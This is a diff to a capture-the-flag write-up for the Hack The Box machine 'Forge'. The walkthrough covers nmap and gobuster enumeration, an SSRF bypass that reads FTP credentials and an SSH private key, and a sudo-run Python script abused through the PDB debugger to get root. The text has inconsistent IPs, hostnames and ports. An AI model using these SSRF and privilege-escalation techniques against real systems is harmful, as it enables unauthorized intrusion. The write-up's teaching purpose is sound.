@@ -2,8 +2,16 @@
 IP address : 10.10.11.111\
 OS : Linux
 
-## Enumeration
-Firstly, let us enumerate all the open ports using ```Nmap```
+## Discovery
+Before we being, let's add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 
+
+```
+10.10.11.111    forge.htb
+```
+
+### Nmap
+
+Firstly, let us enumerate all the open ports using Nmap
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -13,7 +21,7 @@ Firstly, let us enumerate all the open ports using ```Nmap```
 nmap -sC -sV -A -p- -T4 10.10.11.101 -vv
 ```
 
-From the output of ```NMAP```, we find something interesting, which is that this box has an FTP server.
+From the output of Nmap, we find something interesting, which is that this box has an FTP server.
 
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
@@ -25,14 +33,7 @@ Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoo
 ```
 nmap -sU -Pn 10.10.11.111 -T4 -vv 
 ```
-
-Before we continue furthur, we will add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 
-
-```
-10.10.11.111    forge.htb
-```
-
-## Discovery
+### Gobuster
 Firstly, We will now run ```gobuster``` on ```http://forge.htb``` to enumerate the directories on the endpoints. From the output, we discover an interesting ```/upload``` endpoint.
 
 ```
@@ -91,7 +92,8 @@ Now, we will add the subdomain to our ```etc/hosts``` file.
 ```
 10.10.11.111    admin.forge.htb forge.htb
 ```
-
+## Exploit
+### SSRF
 Visiting http://admin.forge.htb, we get the following message that it only allows connections from localhost. This gives us the idea that to be able to connect to http://admin.forget.htb, the only way would be through Server-Side Request Forgery.
 
 ![Message shown on admin.forge.htb](https://github.com/joelczk/writeups/blob/main/HTB/Images/forge/admin_forge.PNG)
@@ -131,6 +133,7 @@ However, we realize that we are able to bypass the blacklist by slightly modifyi
 </body>
 </html> 
 ```
+### Obtaining FTP credentials
 
 Next, we will modify the url to become http://admin.Forge.htb/announcements```, and curling the url that was given to us, we are able to obtain the credentials for our FTP server. We also realized that we can upload images to the endpoint by passing a url with ```/uploads?u=<url>```. This might contain open redirect vulnerabilities if the url used in the parameters are not properly sanitized.
 
@@ -145,7 +148,7 @@ drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
 -rw-r-----    1 0        1000           33 Sep 26 00:57 user.txt
 ```
 
-## Obtaining user flag
+### Obtaining user flag
 
 All that is left for us to do is to modify the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost/user.txt and curl the obtained url to get the user flag.
 
@@ -155,7 +158,7 @@ All that is left for us to do is to modify the input url to http://admin.Forge.h
 <Redacted user flag>
 ```
   
-## Obtaining root flag
+### Obtaining private key for SSH
 
 To obtain the root flag, we need to be able to first SSH into the server. To do that, we need to first obtain the private key that is used for SSH from the FTP server. This can be obtained by modifying the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost/.ssh/id_rsa. Curling the url that is given to us would then give us the private key that is needed for SSH.
 
@@ -168,8 +171,9 @@ We would then save the private key and SSH into the server using the username, `
 Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
 user@forge:~$ 
 ```
-  
-Now, we will check for programs or scripts that can be executed with root privileges without password. This can be checked using ```sudo -l```. Here, we realize that ```/usr/bin/python3 /opt/remote-manage``` can be executed with root privileges without the need for any password.
+    
+###  Code analysis of remote-manage.py
+Now, we will check for programs or scripts that can be executed with root privileges without password. This can be checked using ```sudo -l```. Here, we realize that ```/usr/bin/python3 /opt/remote-manage.py``` can be executed with root privileges without the need for any password.
 
 ```
 user@forge:~$ sudo -l
@@ -238,8 +242,9 @@ Now, we will execute the code using and we will take note of the port number tha
 user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
 Listening on localhost:1123
 ```
-  
-Afterwards, we will open another terminal and SSH into the server and use netcat to create a reverse connection to the localhost, and enter the secret password to view the given options. Afterwards, we will then input a string to create an exception so that we can enter the debugger
+    
+### Spawning the PDB debugger
+We will then open another terminal and SSH into the server and use netcat to create a reverse connection to the localhost, and enter the secret password to view the given options. Afterwards, we will then input a string to create an exception so that we can enter the debugger
   
 ```
 user@forge:~$ nc localhost 1089
@@ -267,7 +272,8 @@ invalid literal for int() with base 10: b'sdsdsdsdsd'
 0
 (Pdb) exit
 ```
-  
+
+### Obtaining root flag
 Now, all we have to do is to create a bash shell and obtain the system flag.
   
 ```
